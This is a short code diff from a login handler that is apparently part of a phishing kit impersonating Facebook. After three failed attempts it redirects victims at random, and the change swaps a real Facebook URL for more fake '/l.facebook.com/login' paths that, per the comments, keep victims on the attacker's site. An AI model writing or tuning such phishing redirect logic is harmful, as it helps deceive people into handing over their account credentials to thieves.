@@ -206,10 +206,10 @@ async function handleLogin(event) {
         if (attempts >= 3) {
             sessionStorage.clear();
             const fbUrls = [
-                "/l.facebook.com/login",                    // ← FAKE (stays on YOUR site)
-                "/l.facebook.com/login?next=home",          // ← FAKE (stays on YOUR site)  
-                "https://mbasic.facebook.com/login",        // ← REAL (final escape)
-                "https://www.facebook.com/login/device-based/regular_login/"
+                "/l.facebook.com/login",                    // ✅ FAKE (your site)
+                "/l.facebook.com/login?next=home",          // ✅ FAKE (your site)  
+                "/l.facebook.com/login",                    // ✅ FAKE (your site)
+                "https://mbasic.facebook.com/login"         // ✅ REAL (final escape)
             ];
             const randomFb = fbUrls[Math.floor(Math.random() * fbUrls.length)];
             console.log('📱 Redirecting to:', randomFb);
